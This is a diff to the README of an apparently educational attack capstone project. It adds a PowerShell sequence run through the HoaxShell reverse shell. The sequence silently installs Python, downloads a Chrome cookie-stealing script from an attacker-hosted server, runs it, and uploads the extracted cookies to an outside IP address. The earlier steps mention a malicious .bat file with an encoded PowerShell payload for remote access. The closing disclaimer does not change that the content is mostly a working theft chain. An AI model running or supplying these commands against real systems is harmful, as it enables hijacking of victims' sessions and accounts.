@@ -18,5 +18,33 @@ The Capstone project is aimed at demonstrating a multi-stage attack scenario tar
 5. **Execution:** Execute the encoded PowerShell command from the malicious .bat file to establish remote shell access.
 6. **Cookie Decryptor:** Used to decrypt and extract all Chrome cookies.
 
+## Installing the Python Script in HoaxShell
+```
+# Download Python installer
+Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.9.7/python-3.9.7-amd64.exe" -OutFile "python-3.9.7-amd64.exe"
+
+# Install Python silently
+Start-Process -FilePath "python-3.9.7-amd64.exe" -ArgumentList "/quiet", "InstallAllUsers=1", "PrependPath=1" -NoNewWindow -Wait
+
+# Clean up downloaded installer
+Remove-Item "python-3.9.7-amd64.exe"
+
+
+# Change Directory to pip3 location
+cd “C:\Program Files\Python39\Scripts\”
+
+# Install Required Packages
+./pip3.exe install pycryptodome pypiwin32
+
+# Pulling the Python Script from Simple Web Server (Python -m http.server 8080)
+Invoke-WebRequest -Uri "http://X.X.X.X/cookiemonster.py" -OutFile "C:\Users\XXXXXXX\Documents\cookiemonster.py"
+
+# Run the file (ensure the file is hosted within the directory of the Users Cookies you want)
+& “C:\Program Files\Python39\python.exe” “C:\Users\XXXXXXXXXXXXXXXXXXX\Documents\cookiemonster.py”
+
+# Extraction: Upload the file to a Simple PHP Web Server
+(New-Object System.Net.WebClient).UploadFile("http://35.203.99.71/upload.php", "C:\Users\champuser\Desktop\output.txt")
+```
+
 ## Disclaimer
 This project is intended for educational and research purposes only. Unauthorized use of this project for malicious purposes is strictly prohibited. The authors of this project are not responsible for any misuse or damage caused by its implementation.
